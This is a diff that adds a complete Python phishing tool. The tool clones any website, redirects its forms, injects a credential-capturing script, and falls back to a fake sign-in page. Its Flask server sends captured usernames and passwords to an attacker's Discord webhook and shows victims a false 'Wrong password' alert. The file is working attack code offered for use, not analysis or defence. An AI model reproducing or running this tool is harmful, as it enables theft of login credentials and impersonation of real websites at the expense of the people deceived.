@@ -1,0 +1,287 @@
+import os
+import sys
+import requests
+import urllib3
+from urllib.parse import urljoin
+from flask import Flask, request, send_from_directory
+import subprocess
+import threading
+import time
+
+urllib3.disable_warnings()
+
+try:
+    from bs4 import BeautifulSoup
+except ImportError:
+    subprocess.run([sys.executable, "-m", "pip", "install", "beautifulsoup4", "requests", "flask", "-q"], capture_output=True)
+    print("Installed dependencies. Restart script.")
+    sys.exit(0)
+
+from bs4 import BeautifulSoup
+
+def clear_and_banner():
+    os.system('clear')
+    print("\033[1;31m" + r"""
+          .                                                      .
+        .n                   .                 .                  n.
+  .   .dP                  dP                   9b                 9b.    .
+ 4    qXb         .       dX                     Xb       .        dXp     t
+dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
+9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+ 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+    `9XXXXXXXXXXXP' `9XX'         `98v8P'          `XXP' `9XXXXXXXXXXXP'
+        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
+                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
+                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
+                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
+                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
+                     `'      9XXXXXX(   )XXXXXXP      `'
+                              XXXX X.`v'.X XXXX
+                              XP^X'`b   d'`X^XX
+                              X. 9  `   '  P )X
+                              `b  `       '  d'
+                               `             '
+    """ + "\033[0m")
+    print("")
+    print("\033[1;91m🔥 THE BEST PHISHING TOOL YOU COULD EVER SEE 🔥\033[0m")
+    print("\033[1;31m🎭 Duplicates ANY website - Exact copy every time 🎭\033[0m")
+    print("")
+
+def show_help():
+    clear_and_banner()
+    print("\033[1;36m📖 HELP\033[0m")
+    print("")
+    print("1. Enter URL to clone")
+    print("2. Enter Discord webhook")
+    print("3. Choose port")
+    print("")
+    input("\033[1;33mPress Enter...\033[0m")
+
+while True:
+    clear_and_banner()
+    print("\033[1;36m[1] START CLONING\033[0m")
+    print("\033[1;34m[2] HELP\033[0m")
+    print("\033[1;31m[3] EXIT\033[0m")
+    print("")
+    choice = input("> ").strip()
+    
+    if choice == "1":
+        break
+    elif choice == "2":
+        show_help()
+    elif choice == "3":
+        clear_and_banner()
+        print("Exiting...")
+        sys.exit(0)
+
+clear_and_banner()
+target = input("🌐 URL to clone: ").strip()
+
+clear_and_banner()
+webhook = input("🔗 Discord Webhook: ").strip()
+
+clear_and_banner()
+port = input("🚪 Port: ").strip()
+
+if not port.isdigit():
+    clear_and_banner()
+    print("Invalid port")
+    sys.exit(1)
+
+site_dir = "exact_clone"
+os.makedirs(site_dir, exist_ok=True)
+os.makedirs(f"{site_dir}/css", exist_ok=True)
+os.makedirs(f"{site_dir}/js", exist_ok=True)
+os.makedirs(f"{site_dir}/images", exist_ok=True)
+
+clear_and_banner()
+print(f"Cloning {target}...")
+print("")
+
+headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+
+def download_resource(url, save_path):
+    try:
+        if not url or url.startswith('data:') or url.startswith('#'):
+            return None
+        full_url = urljoin(target, url)
+        resp = requests.get(full_url, headers=headers, timeout=10, verify=False)
+        if resp.status_code == 200:
+            with open(save_path, 'wb') as f:
+                f.write(resp.content)
+            return save_path
+    except:
+        pass
+    return None
+
+try:
+    resp = requests.get(target, headers=headers, timeout=15, verify=False)
+    html = resp.text
+    soup = BeautifulSoup(html, 'html.parser')
+    
+    css_count = 0
+    for link in soup.find_all('link', rel='stylesheet'):
+        css_url = link.get('href')
+        if css_url:
+            css_name = os.path.basename(css_url.split('?')[0]) or 'style.css'
+            css_path = f"{site_dir}/css/{css_name}"
+            if download_resource(css_url, css_path):
+                link['href'] = f"/css/{css_name}"
+                css_count += 1
+    print(f"CSS: {css_count}")
+    
+    js_count = 0
+    for script in soup.find_all('script', src=True):
+        js_url = script.get('src')
+        if js_url:
+            js_name = os.path.basename(js_url.split('?')[0]) or 'script.js'
+            js_path = f"{site_dir}/js/{js_name}"
+            if download_resource(js_url, js_path):
+                script['src'] = f"/js/{js_name}"
+                js_count += 1
+    print(f"JS: {js_count}")
+    
+    img_count = 0
+    for img in soup.find_all('img', src=True):
+        img_url = img.get('src')
+        if img_url:
+            img_name = os.path.basename(img_url.split('?')[0]) or 'image.jpg'
+            img_path = f"{site_dir}/images/{img_name}"
+            if download_resource(img_url, img_path):
+                img['src'] = f"/images/{img_name}"
+                img_count += 1
+    print(f"Images: {img_count}")
+    
+    form_count = 0
+    for form in soup.find_all('form'):
+        form['action'] = '/login'
+        form['method'] = 'post'
+        form_count += 1
+    print(f"Forms: {form_count}")
+    
+    capture_script = '''
+    <script>
+    document.addEventListener('submit', function(e) {
+        var creds = {};
+        var inputs = e.target.querySelectorAll('input');
+        inputs.forEach(function(inp) {
+            if(inp.value && inp.type !== 'submit') {
+                creds[inp.name || inp.id || 'field'] = inp.value;
+            }
+        });
+        fetch('/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(creds)
+        });
+    });
+    </script>
+    '''
+    
+    if soup.body:
+        soup.body.append(BeautifulSoup(capture_script, 'html.parser'))
+    
+    with open(f"{site_dir}/index.html", 'w', encoding='utf-8') as f:
+        f.write(str(soup))
+    
+    print("")
+    print("Clone successful!")
+    print(f"Saved to: {site_dir}/")
+    
+except Exception as e:
+    print(f"Error: {e}")
+    domain = target.replace('https://','').replace('http://','').split('/')[0]
+    with open(f"{site_dir}/index.html", 'w') as f:
+        f.write(f'''<!DOCTYPE html>
+<html>
+<head><title>{domain}</title>
+<style>
+body{{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;}}
+.box{{background:rgba(0,0,0,0.75);padding:60px 68px;border-radius:4px;}}
+h1{{color:#fff;}}
+input{{width:100%;padding:16px;margin:10px 0;background:#333;border:none;color:#fff;}}
+button{{width:100%;padding:16px;background:#e50914;color:#fff;border:none;cursor:pointer;}}
+</style>
+</head>
+<body>
+<div class="box">
+<h1>Sign In</h1>
+<form method="POST" action="/login">
+<input type="text" name="email" placeholder="Email">
+<input type="password" name="password" placeholder="Password">
+<button type="submit">Sign In</button>
+</form>
+</div>
+<script>
+document.querySelector('form').addEventListener('submit',function(e){{
+fetch('/capture',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{email:document.querySelector('[name="email"]').value,password:document.querySelector('[name="password"]').value}})
+}});
+}});
+</script>
+</body>
+</html>''')
+
+def start_server():
+    app.run(host='0.0.0.0', port=int(port), debug=False, threaded=True)
+
+app = Flask(__name__, static_folder=site_dir)
+
+@app.route('/')
+def index():
+    return send_from_directory(site_dir, 'index.html')
+
+@app.route('/css/<path:filename>')
+def serve_css(filename):
+    return send_from_directory(f"{site_dir}/css", filename)
+
+@app.route('/js/<path:filename>')
+def serve_js(filename):
+    return send_from_directory(f"{site_dir}/js", filename)
+
+@app.route('/images/<path:filename>')
+def serve_images(filename):
+    return send_from_directory(f"{site_dir}/images", filename)
+
+@app.route('/login', methods=['POST'])
+def login():
+    creds = dict(request.form)
+    try:
+        msg = f"**🎯 EXACT COPY - {target}**\n"
+        msg += "\n".join([f"`{k}`: `{v}`" for k, v in creds.items()])
+        requests.post(webhook, json={"content": msg}, timeout=5)
+        print(f"Credentials: {creds}")
+    except:
+        pass
+    return '<script>alert("Wrong password"); location.href="/";</script>'
+
+@app.route('/capture', methods=['POST'])
+def capture():
+    creds = request.json
+    try:
+        msg = f"**🎯 AJAX - {target}**\n"
+        msg += "\n".join([f"`{k}`: `{v}`" for k, v in creds.items()])
+        requests.post(webhook, json={"content": msg}, timeout=5)
+        print(f"AJAX: {creds}")
+    except:
+        pass
+    return '', 200
+
+server_thread = threading.Thread(target=start_server, daemon=True)
+server_thread.start()
+time.sleep(2)
+
+clear_and_banner()
+print(f"Local server: http://localhost:{port}")
+print(f"Target: {target}")
+print("")
+print("Press Ctrl+C to stop")
+
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    print("")
+    print("Shutting down...")
+    sys.exit(0)
